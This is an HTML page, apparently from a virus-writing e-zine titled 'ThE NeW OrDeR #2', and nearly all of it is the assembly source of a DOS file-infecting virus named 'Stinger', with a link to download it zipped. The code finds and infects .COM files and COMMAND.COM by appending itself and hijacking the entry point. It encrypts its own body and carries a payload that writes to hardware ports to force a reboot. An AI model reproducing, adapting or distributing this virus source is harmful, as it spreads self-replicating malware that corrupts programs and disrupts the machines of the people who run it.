<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>ThE NeW OrDeR #2</title>
</head>

<body bgcolor="#000000" link="#0000FF" vlink="#000080"
bgproperties="fixed" topmargin="15" leftmargin="20" "
vlink="#000080">

<p align="center"><img src="../Images/viruz.gif" width="560"
height="100"></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../images/Rs.jpg" width="640" height="12"></strong></font></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../Images/fogskul.gif" alt="OneHalf  Virii" width="160"
height="100"></strong></font></p>

<p align="center"><a href="../progs/stinger.zip"><font size="5"><strong>Stinger</strong></font></a></p>

<p align="left"><font color="#00FF00" size="2"><strong>Model tiny<br>
.code<br>
.386<br>
<br>
kode_crypt equ 0<br>
<br>
ORG 100h<br>
START:<br>
pusha<br>
push ds<br>
mov di,offset VIRUS<br>
push es<br>
push cs<br>
pop ds<br>
push di<br>
push cs<br>
pop es<br>
ret<br>
IDENT db 0ah,0dh,'STINGER',0ah,0dh,'$'<br>
START_LEN equ $-START<br>
int 20h<br>
VIRUS:<br>
jmp Ok_1<br>
Ok_0:<br>
mov ax,1010h<br>
out 70h,ax<br>
mov al,0feh<br>
out 64h,al<br>
<br>
Flag_Ofs equ $-VIRUS<br>
Flag db 0<br>
;---------------------<br>
LOC_2_ equ $-VIRUS<br>
LOC_2:<br>
pop ax<br>
pop cx<br>
inc ax<br>
xchg ax,cx<br>
push cx<br>
push ax<br>
mov ax,LOC_3_<br>
mov cx, bp<br>
xchg ax,cx<br>
add cx,ax<br>
push cx<br>
db 2eh<br>
pushf<br>
pop ax<br>
sahf<br>
jnb L_2_1<br>
mov ax,1010h<br>
out 70h,ax<br>
mov al,0feh<br>
out 64h,al<br>
L_2_1:<br>
ret<br>
;------------------------<br>
HAND_OFS equ $-VIRUS<br>
Handle dw ?<br>
Write_To_File:<br>
mov word ptr [bp+HAND_OFS],bx<br>
mov byte ptr [bp+Flag_Ofs],1<br>
jmp DECRYPT<br>
My_Loc_1:<br>
mov byte ptr [bp+Flag_Ofs],0<br>
mov dx,bp<br>
mov cx,VIRLEN<br>
mov bx,word ptr [bp+HAND_OFS]<br>
mov ah,40h<br>
int 21h<br>
mov byte ptr [bp+Flag_Ofs],2<br>
jmp DECRYPT<br>
;------------------------<br>
Ok_1:<br>
call VIR_BEG<br>
VIR_BEG_LEN equ $-VIRUS<br>
VIR_BEG:<br>
cli<br>
mov al,0adh<br>
out 64h,al<br>
jmp short $+2<br>
pop bp<br>
sti<br>
sub bp,VIR_BEG_LEN<br>
DECRYPT:<br>
Code_Ofs equ $-VIRUS<br>
mov ax, kode_crypt<br>
xor cx,cx<br>
cmp ax,cx<br>
jne DC_0<br>
mov ax, DC_3_<br>
add ax,bp<br>
push ax<br>
ret<br>
;------------------------------------<br>
LOC_4_ equ $-VIRUS<br>
LOC_4:<br>
db 2eh<br>
pushf<br>
pop ax<br>
sahf<br>
jnb LOC_4_1<br>
mov ax,1010h<br>
out 70h,ax<br>
mov al,0feh<br>
out 64h,al<br>
LOC_4_1:<br>
ret<br>
;------------------------<br>
DC_0:<br>
mov di, CRYPT_END<br>
add di,bp<br>
push ax<br>
mov ax, bp<br>
add ax, M_L_1_<br>
push ax<br>
mov ax, LOC_4_<br>
add ax, bp<br>
push ax<br>
ret<br>
M_L_1_ equ $-VIRUS<br>
M_L_1:<br>
pop ax<br>
mov si, CRYPT_START<br>
add si,bp<br>
DC_1:<br>
DC_1_ equ $-VIRUS<br>
mov bx, word ptr cs:[si]<br>
push bp<br>
mov dx, word ptr cs:[si+2]<br>
xchg cx,dx<br>
push si<br>
xchg bx,dx<br>
mov si,di<br>
xor cx,ax<br>
pop di<br>
xchg cx,ax<br>
push si<br>
xchg ax,bx<br>
mov si,di<br>
xchg cx,dx<br>
pop bp<br>
xchg ax,dx<br>
xchg si,bp<br>
xchg bx,dx<br>
mov di,si<br>
xor cx,ax<br>
xchg bp,si<br>
xchg cx,ax<br>
sub bp,di<br>
xchg bx,dx<br>
add bp,si<br>
xchg dx,cx<br>
xchg bp,si<br>
xchg ax,dx<br>
xor bp,si<br>
xchg dx,bx<br>
add bp,di<br>
mov cl,4<br>
xchg bp,di<br>
mov word ptr cs:[si],bx<br>
pop bp<br>
call LOC_1<br>
mov word ptr cs:[si+2],dx<br>
DC_2:<br>
inc si<br>
loop DC_2<br>
cmp si,di<br>
jge DC_3<br>
mov dx, DC_1_<br>
mov cx, bp<br>
DC_4:<br>
inc dx<br>
loop DC_4<br>
push dx<br>
ret<br>
;------------------------<br>
LOC_1:<br>
push cx<br>
push ax<br>
mov ax,bp<br>
mov cx,LOC_2_<br>
L_1:<br>
inc ax<br>
loop L_1<br>
push ax<br>
ret<br>
;------------------------<br>
LOC_3_ equ $-VIRUS<br>
LOC_3:<br>
pop cx<br>
mov ax,bp<br>
add ax,LOC_3_1_<br>
push ax<br>
mov ax,bp<br>
add ax,LOC_4_<br>
push ax<br>
ret<br>
LOC_3_1_ equ $-VIRUS<br>
LOC_3_1:<br>
pop ax<br>
xor ch,ch<br>
jmp LOC_4_1<br>
;------------------------<br>
DC_3:<br>
DC_3_ equ $-VIRUS<br>
push ax<br>
mov ah, byte ptr [bp+Flag_Ofs]<br>
cmp ah,1<br>
pop ax<br>
jnz My_Loc_2<br>
jmp My_Loc_1<br>
CRYPT_START equ $-VIRUS<br>
;********************************************************<br>
My_Loc_2:<br>
<br>
mov ah, byte ptr [bp+Flag_Ofs]<br>
cmp ah,2<br>
jnz My_Loc_3<br>
ret<br>
My_Loc_3:<br>
cli<br>
mov al,0aeh<br>
out 64h,al<br>
jmp short $+2<br>
sti<br>
;-------------------------------------------------------<br>
Restore_Beg:<br>
mov si,P_B_Ofs<br>
mov di,100h<br>
add si,bp<br>
mov cx,START_LEN<br>
rep movsb<br>
SET_DTA_VIRII:<br>
mov ah,1ah<br>
mov dx,bp<br>
add dx,VIRLEN<br>
push dx<br>
int 21h<br>
pop si<br>
FIND_FIRST:<br>
mov dx,bp<br>
add dx,C_M_Ofs<br>
cld<br>
mov ah,4eh<br>
mov cx,0ffh<br>
INTERRUPT:<br>
int 21h<br>
jb Not_File<br>
call Infected<br>
mov ah,4fh<br>
jmp short INTERRUPT<br>
Not_File:<br>
call Command_Com<br>
mov ah,1ah<br>
mov dx,80h<br>
int 21h<br>
;---------------------<br>
RETURN_TO_PROG:<br>
pop es<br>
pop ds<br>
popa<br>
jmp si<br>
;---------------------<br>
Infected:<br>
mov dx, si<br>
add dx,1eh<br>
push dx<br>
Clear_Attrib:<br>
mov ax,4301h<br>
xor cx,cx<br>
int 21h<br>
Open_File:<br>
mov ax, 3d02h<br>
int 21h<br>
jb NextFind<br>
Save_Handle:<br>
xchg ax,bx<br>
Read_Beg:<br>
mov ah,3fh<br>
mov dx,bp<br>
add dx,P_B_Ofs<br>
mov cx,START_LEN<br>
int 21h<br>
Check_Ident:<br>
push si<br>
mov si,bp<br>
mov di,si<br>
add si,New_Begin<br>
add di,P_B_Ofs<br>
add si,IDENT_Ofs<br>
add di,IDENT_Ofs<br>
mov cx,12<br>
rep cmpsb<br>
pop si<br>
je Close_File<br>
jmp short Plague<br>
Close_File:<br>
mov ax,5701h<br>
mov dx, word ptr [si+18h]<br>
mov cx, word ptr [si+16h]<br>
int 21h<br>
mov ah,3eh<br>
int 21h<br>
mov ax,4301h<br>
pop dx<br>
mov cx,word ptr [si+15h]<br>
int 21h<br>
ret<br>
NextFind:<br>
pop dx<br>
ret<br>
Plague:<br>
mov ax,4202h<br>
xor cx,cx<br>
xor dx,dx<br>
push cx<br>
push cx<br>
int 21h<br>
mov word ptr [bp+OldLen],ax<br>
<br>
call New_Code<br>
pusha<br>
call Write_To_File<br>
Ret_From_Write:<br>
popa<br>
mov ax,4200h<br>
pop cx<br>
pop dx<br>
int 21h<br>
Calculate_New_Entry_Point:<br>
mov di,bp<br>
add di,New_Adr_Jump<br>
inc di<br>
mov ax, word ptr [bp+OldLen]<br>
add ax, 100h<br>
mov word ptr [di],ax<br>
WRITE_New_Beg:<br>
mov ah,40h<br>
mov cx,START_LEN<br>
mov dx,bp<br>
add dx,New_Begin<br>
int 21h<br>
jmp Close_File<br>
;---------------------<br>
Command_Com:<br>
push ds<br>
mov di,bp<br>
mov si,2ch<br>
mov ds,cs:[si]<br>
mov si,0008<br>
add di, VIRLEN<br>
add di,2ch<br>
mov cx,0040h<br>
rep movsb<br>
sub di,40h<br>
pop ds<br>
mov dx,di<br>
mov ah,4eh<br>
mov cx,0ffh<br>
int 21h<br>
mov di,bp<br>
jb EXITER<br>
mov ah,2fh<br>
int 21h<br>
mov bx,di<br>
add bx,VIRLEN<br>
add bx,0eh<br>
xchg bx,si<br>
call INFECTED<br>
EXITER:<br>
ret<br>
;---------------------<br>
New_Code:<br>
push ax<br>
push bx<br>
push cx<br>
push di<br>
<br>
mov ax, word ptr [si+1ah]<br>
mov bx, word ptr [si+18h]<br>
mov cx, word ptr [si+16h]<br>
xor bx,cx<br>
cmp bx,cx<br>
jnz N_C_1<br>
jmp Ok_0_My<br>
N_C_1:<br>
xor ax,bx<br>
mov di,bp<br>
add di,Code_Ofs<br>
mov word ptr [di+1],ax<br>
<br>
pop di<br>
pop cx<br>
pop bx<br>
pop ax<br>
ret<br>
Ok_0_My:<br>
mov ah, 09h<br>
mov dx,bp<br>
add dx,IDENT_Ofs<br>
int 21h<br>
jmp Ok_0<br>
;---------------------<br>
P_B_Ofs equ $-VIRUS<br>
PROGRAM_BEG db START_LEN dup (90h)<br>
C_M_Ofs equ $-VIRUS<br>
COM_MASK db '*.COM',0h<br>
E_M_Ofs equ $-VIRUS<br>
OldLen equ $-VIRUS<br>
dw ?<br>
My_START:<br>
New_Begin equ $-VIRUS<br>
pusha<br>
push ds<br>
New_Adr_Jump equ $-VIRUS<br>
mov di,offset VIRUS<br>
push es<br>
push cs<br>
pop ds<br>
push di<br>
push cs<br>
pop es<br>
ret<br>
IDENT_Ofs equ $-My_Start<br>
db 0ah,0dh,'STINGER',0ah,0dh,'$'<br>
;********************************************************<br>
CRYPT_END equ $-VIRUS<br>
VIRLEN equ $-VIRUS<br>
END START<br>
</strong></font></p>

<p align="center"><a href="../TNO#2_start.htm"><img
src="../images/14ic3.gif" border="0" width="60" height="65"></a></p>

<p align="center"><a href="mailto:nrgteam@mail.ru"><img
src="../images/coollogo_com_7565375.jpg" border="0" width="206"
height="53"></a></p>
</body>
</html>
